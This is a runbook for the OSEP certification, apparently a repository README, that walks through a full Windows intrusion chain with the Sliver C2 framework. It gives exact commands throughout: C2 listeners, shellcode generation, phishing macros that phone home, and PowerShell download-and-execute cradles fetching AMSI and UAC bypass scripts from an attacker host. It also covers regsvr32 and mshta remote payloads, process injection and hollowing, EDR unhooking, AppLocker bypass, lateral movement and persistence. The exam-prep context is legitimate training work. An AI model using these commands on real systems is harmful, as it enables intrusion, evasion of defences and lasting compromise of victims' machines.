# OSEP Runbook — Sliver + osep-tools (step-wise)

One decision tree from initial access to post-exploitation. Each row is:
**situation → technique → exact command** (file references are to this repo).

Legend: `<IP>` = your attacker IP, `<TARGET>` = victim host, `<PORT>` = your C2 port.

---

## 0. C2 setup (attacker, once)

```bash
# Start Sliver (single binary — auto-starts the server)
sliver

# Start a listener (pick ONE transport; mTLS is the OSEP default)
sliver > mtls    --lhost 0.0.0.0 --lport 8888     # recommended default
sliver > https   --lhost 0.0.0.0 --lport 443      # blends with web traffic
sliver > http    --lhost 0.0.0.0 --lport 80
sliver > wg      --lport 53                        # WireGuard (fast)
sliver > dns     --domains yourdomain.com          # DNS (rare in OSEP)

# Confirm listener is up
sliver > jobs
```

| Situation | Transport | Reason |
|---|---|---|
| Default / unknown egress | `mtls :8888` | Simplest, reliable, no HTTP artifact |
| Target proxies web traffic | `https :443` | Blends into TLS/443 |
| Only DNS egress | `dns` | Slow but works when TCP is blocked |
| Need speed / stealth | `wg` | WireGuard, low C2 signature |

---

## 1. Initial access & recon

### Situation: you know nothing about the target (AppLocker? arch? Office bitness?)
**Use the recon macro** — phones home with a GET path telling you what to deploy next.

```bash
python3 -m http.server 80     # just watch the request path
```

1. Edit `word-macro/recon/starter-word-macro.vba`: set `serverURL` to `http://<IP>`.
2. Insert into Word (Alt+F11 → Insert → Module → paste → save as `.docm`).
3. Deliver (phish / upload).

Read the path in your HTTP logs:

| GET path | Meaning | Next step |
|---|---|---|
| `/applockeroff/os64_word64` | No AppLocker, 64-bit everywhere | Section 2 + any 64-bit runner |
| `/applockeroff/os64_word32` | No AppLocker, 32-bit Office | Use a 32-bit shellcode build |
| `/applockeron/...` | **AppLocker on** | Section 6 (InstallUtil/msbuild/regsvr32) |

### Situation: Office is present and macros run → Word macro
| AV pressure | Macro | Obfuscation | File |
|---|---|---|---|
| Low | Caesar runner | +2 (weak) | `word-macro/caesar-cipher/` |
| Medium | XOR runner | 3-byte XOR, W^X | `word-macro/xor-shellcode-runner/` |
| Medium-High | Alt runner | XOR + `HeapAlloc` + `EnumSystemGeoID` | `word-macro/alternative-shellcode-runner/` |

### Situation: no Office / macro blocking → HTA
| AppLocker | HTA | File |
|---|---|---|
| Off | PowerShell cradle (in-memory) | `hta-delivery/red.hta` |
| On | bitsadmin + InstallUtil | `hta-delivery/black.hta` |

Deliver: `mshta.exe http://<IP>/red.hta`

> **Payload type matters:** `black.hta` runs `installutil.exe /U` on a decoded `shell.exe`,
> which must be a **.NET InstallUtil payload** (compile
> `word-macro/installutil-applocker-bypass/installutil.cs`) — **not** a raw Sliver/Go implant,
> because InstallUtil only executes .NET assemblies. `red.hta` runs an in-memory PowerShell
> `payload.ps1` (no disk write).

---

## 2. Generate shellcode (Sliver)

```bash
# Raw PIC shellcode (→ encrypt, or → NimSyscallPacker)
sliver > generate --mtls <IP>:8888 --format shellcode --save /tmp/sc.bin

# Convert to C# / PowerShell byte arrays for the loaders:
python3 sliver/sliver2arrays.py /tmp/sc.bin --csharp   # aes-loaders/, cs-loaders/
python3 sliver/sliver2arrays.py /tmp/sc.bin --ps1      # ps-shellcode-runner.ps1

# Standalone EXE (→ NimSyscallPacker, or direct delivery)
sliver > generate --mtls <IP>:8888 --format exe --save /tmp/implant.exe
```

### Situation: the injected blob must stay small (tight VBA / shellcode runner)
Use a **stager** (few hundred bytes) instead of the full implant (MBs):

```bash
sliver > profiles new --mtls <IP>:8888 --format shellcode my-profile
sliver > stage-listener --url http://<IP>:8080 --profile my-profile
sliver > generate --format shellcode --stage-listener http://<IP>:8080 --save /tmp/stager.bin
```

Convert raw → array when needed:

```bash
python3 sliver/sliver2arrays.py /tmp/sc.bin --csharp   # C#  byte[]
python3 sliver/sliver2arrays.py /tmp/sc.bin --ps1      # PowerShell
python3 sliver/sliver2arrays.py /tmp/sc.bin --vba      # VBA  Array(...)
```

> **Rule of thumb:** full Sliver shellcode is MBs — only use it in C# runners that
> allocate `shellcode.Length` (all loaders in this repo now do). For VBA macros,
> use `sliver2arrays.py --vba` output or a stager.

---

## 3. Obfuscate / encrypt (anti-VV)

Weakest → strongest; pick based on how much Defender is watching.

| Level | Technique | Encryptor | Command |
|---|---|---|---|
| 1 | Caesar +2 | `word-macro/caesar-cipher/vba-caesar-cipher-encryption.cs` | compile → `Encrypter.exe shellcode.txt` |
| 2 | 3-byte XOR | `word-macro/*/xor-shellcode-encryption-3-byte.cs` | paste `buf` → compile → run |
| 3 | AES-256-CBC | `aes-loaders/aes-shellcode-encryption/aes-shellcode-encryption.cs` | paste `buf` → compile → run |

```powershell
# Compile an encryptor (Windows)
csc /target:exe /platform:x64 /optimize+ /out:Encrypter.exe aes-shellcode-encryption.cs
.\Encrypter.exe          # prints the encrypted byte[] to paste into a runner
```

---

## 4. Execution technique (post-initial-access)

| Situation | Technique | File | Why |
|---|---|---|---|
| Just need it to run (own process) | Self-injection (`VirtualAlloc`+`CreateThread`) | `aes-loaders/aes-normal-runner/` | Simplest |
| Migrate into another process | Remote injection (`CreateRemoteThread`) | `aes-loaders/aes-process-injection/` | Hide in notepad/explorer |
| AV/sandbox is aggressive | NUMA + evasion checks + remote inject | `aes-loaders/aes-av-evasion/` | `VirtualAllocExNuma`, timing/DLL checks |
| No `CreateRemoteThread` allowed | Process hollowing (svchost) | `aes-loaders/aes-process-hollowing/` | PEB walk, resume suspended process |
| EDR hooks `kernel32` inject APIs | Nt* direct APIs | `cs-loaders/nt-injection.cs` | `NtAllocateVirtualMemory`/`NtWriteVirtualMemory`/`NtCreateThreadEx` |
| Bypass thread-creation monitoring | Early-Bird APC | `cs-loaders/apc-injection.cs` | `QueueUserAPC` before thread runs |
| Kill static IAT signatures | Dynamic API resolution | `cs-loaders/dinvoke-runner.cs` | `GetProcAddress` at runtime |
| EDR hooked ntdll (syscalls) | ntdll `.text` unhooking | `cs-loaders/ntdll-unhook.cs` | Fresh copy from `\KnownDLLs` |

```powershell
# Compile + run any C# loader
csc /target:exe /platform:x64 /optimize+ /out:Runner.exe cs-loaders/nt-injection.cs
.\Runner.exe 1234            # (nt-injection takes a PID; others run as-is)
```

---

## 5. AMSI / ETW bypass (PowerShell path only)

Only needed when your payload runs through PowerShell (cradle, stager, runner).

| Situation | Tool | Command |
|---|---|---|
| Any PS execution | Inline AMSI patch | `amsi-bypass/amsi-bypass.ps1` |
| Download + run a PS payload in memory (kills AMSI+ETW+SBL first) | Reflective loader | `ps-loaders/ps-loader.ps1` (set `$PayloadUrl`) |
| Run raw shellcode via PS reflection | Reflection runner | `ps-loaders/ps-shellcode-runner.ps1` (paste `$buf`) |

```powershell
# Always bypass AMSI before running anything that'll get scanned:
IEX (New-Object Net.WebClient).DownloadString('http://<IP>/amsi-bypass.ps1')
IEX (New-Object Net.WebClient).DownloadString('http://<IP>/run.ps1')
```

---

## 6. AppLocker bypass (when recon says `/applockeron`)

AppLocker blocks user-writable EXEs and PowerShell. Use Microsoft-signed LOLBins.

| Situation | Technique | File | Exact command |
|---|---|---|---|
| Full chain from a macro | InstallUtil | `word-macro/installutil-applocker-bypass/` | WMI → bitsadmin download → `installutil.exe /U` |
| Have shell, want code exec | msbuild inline task | `applocker/msbuild-shellcode.xml` | `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe msbuild-shellcode.xml` |
| Have shell, want code exec | regsvr32 scriptlet | `applocker/regsvr32.sct` | `regsvr32.exe /s /n /u /i:http://<IP>/regsvr32.sct scrobj.dll` |

InstallUtil chain (from the macro):

```bash
# host three files
python3 -m http.server 80   # serves InstallUtil.exe, amsi.txt, run.txt
```

```powershell
# inside installutil.cs (already wired): downloads amsi.txt + run.txt, runs via IEX
csc /target:exe /platform:x64 /optimize+ /out:InstallUtil.exe installutil.cs `
  /r:"...\System.Management.Automation.dll" /r:System.Configuration.Install.dll
```

---

## 7. Privilege escalation (medium → high integrity)

| Situation | Tool | Command |
|---|---|---|
| Have a shell, need admin | fodhelper UAC bypass | `uac-bypass/uac-bypass.ps1` |

```powershell
# Set the elevated payload in uac-bypass.ps1, then:
IEX (New-Object Net.WebClient).DownloadString('http://<IP>/uac-bypass.ps1')
```

---

## 8. Lateral movement

| Situation | Technique | File | Command |
|---|---|---|---|
| WinRM enabled / admin creds | PSRemoting | `lateral-movement/winrm-psremoting.ps1` | `.\\winrm-psremoting.ps1 -Computer <TARGET> -Credential $cred -StagerUrl http://<IP>/run.ps1` |
| Admin creds, WMI reachable | WMI `Win32_Process` | `lateral-movement/wmi-exec.ps1` | `.\\wmi-exec.ps1 -Computer <TARGET> -Credential $cred -StagerUrl http://<IP>/run.ps1` |

```powershell
# Interactive remote shell (instead of a script):
$s = New-PSSession -ComputerName <TARGET> -Credential $cred
Enter-PSSession $s
```

---

## 9. Persistence

| Situation | Tool | Section |
|---|---|---|
| Keep access across reboots/logons | `lateral-movement/persistence.ps1` | Run key / scheduled task / WMI event subscription |

```powershell
# Run in an elevated shell on the target after editing $Stager:
.\persistence.ps1
```

---

## 10. CLM bypass (Constrained Language Mode)

| Situation | Technique | Detail |
|---|---|---|
| `$ExecutionContext.SessionState.LanguageMode` = `ConstrainedLanguage` | PowerShell v2 downgrade | `powershell.exe -version 2` (if PSv2 present) |
| CLM + AppLocker | InstallUtil .NET loader | runs a fresh runspace outside CLM |
| CLM won't budge | Drop a compiled C# runner | `cs-loaders/` or `aes-loaders/` — CLM doesn't affect compiled code |

See `lateral-movement/clm-bypass.md`.

---

## 11. Defender / EDR is the real problem → NimSyscallPacker

When plain C#/PS/VBA loaders get caught, pack the payload as a Nim binary using
direct/indirect syscalls + ntdll unhooking + AMSI/ETW bypass.

```bash
# 1. Generate raw shellcode
sliver > generate --mtls <IP>:8888 --format shellcode --save /tmp/sc.bin

# 2. Pack it (check exact flags with --help)
./NimSyscallLoader -f /tmp/sc.bin -o /tmp/loader.exe --unhook --indirect-syscalls

# 3. Start listener + deliver loader.exe
sliver > mtls --lport 8888
```

Build setup: see `nimsyscallpacker/README.md` (Nim 2.2.10 + MinGW-w64 11.1;
`nimble install nimcrypto@0.6.0 docopt ptr_math winim nim-strenc`). ⚠️ The tool is
deprecated/unmaintained — test on a lab VM before exam day.

---

## One-line mental model

1. **Recon** → macro phones home → know AppLocker + arch.
2. **Generate** → `sliver > generate --mtls <IP>:8888 --format <exe|shared|service|shellcode>`; convert shellcode with `sliver2arrays.py`.
3. **Obfuscate** → Caesar < XOR < AES as AV pressure rises.
4. **Execute** → self-inject → remote-inject → hollowing → Nt* → APC → DInvoke → unhook, as EDR pressure rises.
5. **AppLocker** → InstallUtil / msbuild / regsvr32. **PowerShell** → AMSI/ETW first.
6. **Elevate** → fodhelper. **Move** → WinRM/WMI. **Persist** → Run key / task / WMI event.
7. **Defender still wins** → NimSyscallPacker.


